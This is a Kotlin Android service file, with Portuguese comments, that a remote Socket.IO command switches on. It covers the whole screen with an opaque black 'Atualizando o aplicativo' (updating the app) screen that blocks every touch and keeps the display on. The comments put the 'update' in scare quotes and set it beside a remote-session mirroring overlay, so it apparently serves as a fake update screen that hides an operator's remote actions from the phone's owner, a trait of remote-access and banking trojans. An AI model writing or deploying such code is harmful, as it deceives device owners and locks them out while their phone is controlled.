package com.example.acessomaterno

import android.animation.ValueAnimator
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.graphics.RectF
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.animation.LinearInterpolator
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

/**
 * Animação de Atualização do DISPOSITIVO (Preto Profissional) — ETAPA 2.
 * =====================================================================
 * Handler EXCLUSIVO e SEPARADO do dispositivo (não se confunde com o overlay
 * translúcido "Sessão remota" do [OverlayService], nem com a animação do
 * emulador nativo da ETAPA 1). Aqui a tela do aparelho é coberta por uma
 * camada 100% PRETA e OPACA, com um anel giratório e uma barra de progresso
 * suave, deixando claro que o aplicativo está REALMENTE atualizando.
 *
 * Diferença de propósito:
 *  - [OverlayService]  → fundo translúcido, toques livres (espelhamento segue).
 *  - [AtualizacaoDispositivoService] → fundo PRETO opaco, bloqueia toques
 *    (o usuário não interage enquanto "atualiza").
 *
 * Acionado pelo evento Socket.IO "atualizacao_dispositivo" {ativo:true|false}.
 * Exige SYSTEM_ALERT_WINDOW (já concedida no app). Sem a permissão, encerra
 * sozinho sem derrubar o app.
 */
class AtualizacaoDispositivoService : Service() {

    companion object {
        private const val TAG = "AtualizacaoDispositivo"

        @Volatile
        private var instancia: AtualizacaoDispositivoService? = null

        /** True enquanto a tela preta de atualização estiver visível. */
        val isRunning: Boolean get() = instancia != null
    }

    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var anel: AnelProgresso? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instancia = this

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.e(TAG, "SYSTEM_ALERT_WINDOW não concedida — animação não exibida (sem crash).")
            stopSelf()
            return
        }

        handler.post {
            if (overlayView == null) criarTelaAtualizacao()
            if (overlayView == null) stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Permite desligar via extra "ativo"=false (além de stopService).
        if (intent?.getBooleanExtra("ativo", true) == false) {
            stopSelf()
            return START_NOT_STICKY
        }
        return START_NOT_STICKY
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun criarTelaAtualizacao() {
        try {
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

            // Fundo PRETO total e opaco (preto profissional).
            val raiz = FrameLayout(this).apply {
                setBackgroundColor(Color.parseColor("#FF000000"))
            }

            val coluna = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                layoutParams = FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT
                ).apply { gravity = Gravity.CENTER }
            }

            // Anel giratório custom (desenhado à mão, leve).
            val anelView = AnelProgresso(this).apply {
                layoutParams = LinearLayout.LayoutParams(dp(72), dp(72)).apply {
                    bottomMargin = dp(28)
                    gravity = Gravity.CENTER_HORIZONTAL
                }
            }
            anel = anelView

            val titulo = TextView(this).apply {
                text = "Atualizando o aplicativo"
                textSize = 20f
                setTextColor(Color.WHITE)
                setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = dp(10) }
            }

            val subtitulo = TextView(this).apply {
                text = "Instalando a nova versão"
                textSize = 13f
                setTextColor(Color.parseColor("#9AA0A6"))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = dp(28) }
            }

            // Barra de progresso fina, custom (sweep contínuo, profissional).
            val barra = BarraProgresso(this).apply {
                layoutParams = LinearLayout.LayoutParams(dp(220), dp(4)).apply {
                    gravity = Gravity.CENTER_HORIZONTAL
                    bottomMargin = dp(26)
                }
            }

            val aviso = TextView(this).apply {
                text = "Não desligue o dispositivo"
                textSize = 11f
                setTextColor(Color.parseColor("#5F6368"))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }

            coluna.addView(anelView)
            coluna.addView(titulo)
            coluna.addView(subtitulo)
            coluna.addView(barra)
            coluna.addView(aviso)
            raiz.addView(coluna)

            val tipo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }

            // SEM FLAG_NOT_TOUCHABLE: a camada CONSOME os toques → o usuário não
            // interage com nada por baixo enquanto a "atualização" acontece.
            // FLAG_KEEP_SCREEN_ON mantém a tela acesa durante o processo.
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                tipo,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE
            ).apply {
                gravity = Gravity.CENTER
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }

            windowManager?.addView(raiz, params)
            overlayView = raiz
            Log.i(TAG, "Tela de atualização (preto profissional) exibida — toques bloqueados.")
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao criar tela de atualização: ${e.message}", e)
            stopSelf()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            anel?.parar()
            overlayView?.let { windowManager?.removeView(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao remover a tela de atualização: ${e.message}")
        }
        overlayView = null
        anel = null
        windowManager = null
        instancia = null
    }

    // ------------------------------------------------------------------------
    // Anel de progresso giratório (desenho custom, sem assets).
    // ------------------------------------------------------------------------
    private class AnelProgresso(ctx: Context) : View(ctx) {
        private val trilho = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            color = Color.parseColor("#2A2A2A")        // trilho escuro discreto
            strokeCap = Paint.Cap.ROUND
        }
        private val arco = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            color = Color.WHITE                          // arco branco destacado
            strokeCap = Paint.Cap.ROUND
        }
        private val caixa = RectF()
        private var angulo = 0f
        private val animador = ValueAnimator.ofFloat(0f, 360f).apply {
            duration = 900L
            interpolator = LinearInterpolator()
            repeatCount = ValueAnimator.INFINITE
            addUpdateListener {
                angulo = it.animatedValue as Float
                invalidate()
            }
        }

        override fun onAttachedToWindow() {
            super.onAttachedToWindow()
            if (!animador.isStarted) animador.start()
        }

        override fun onDetachedFromWindow() {
            parar()
            super.onDetachedFromWindow()
        }

        fun parar() {
            if (animador.isRunning) animador.cancel()
        }

        override fun onDraw(canvas: Canvas) {
            val w = (3f * resources.displayMetrics.density)
            trilho.strokeWidth = w
            arco.strokeWidth = w
            val pad = w
            caixa.set(pad, pad, width - pad, height - pad)
            canvas.drawArc(caixa, 0f, 360f, false, trilho)
            canvas.drawArc(caixa, angulo, 100f, false, arco)
        }
    }

    // ------------------------------------------------------------------------
    // Barra de progresso fina com "sweep" contínuo (indeterminado, elegante).
    // ------------------------------------------------------------------------
    private class BarraProgresso(ctx: Context) : View(ctx) {
        private val fundo = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#1C1C1C")
        }
        private val barra = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.WHITE
        }
        private val raio get() = height / 2f
        private var frac = 0f   // 0..1 posição do bloco que corre
        private val animador = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 1300L
            interpolator = LinearInterpolator()
            repeatCount = ValueAnimator.INFINITE
            addUpdateListener {
                frac = it.animatedValue as Float
                invalidate()
            }
        }

        override fun onAttachedToWindow() {
            super.onAttachedToWindow()
            if (!animador.isStarted) animador.start()
        }

        override fun onDetachedFromWindow() {
            if (animador.isRunning) animador.cancel()
            super.onDetachedFromWindow()
        }

        override fun onDraw(canvas: Canvas) {
            canvas.drawRoundRect(0f, 0f, width.toFloat(), height.toFloat(), raio, raio, fundo)
            // Bloco de ~35% da largura que corre da esquerda para a direita.
            val larguraBloco = width * 0.35f
            val inicio = (width + larguraBloco) * frac - larguraBloco
            val esq = inicio.coerceAtLeast(0f)
            val dir = (inicio + larguraBloco).coerceAtMost(width.toFloat())
            if (dir > esq) {
                canvas.drawRoundRect(esq, 0f, dir, height.toFloat(), raio, raio, barra)
            }
        }
    }
}
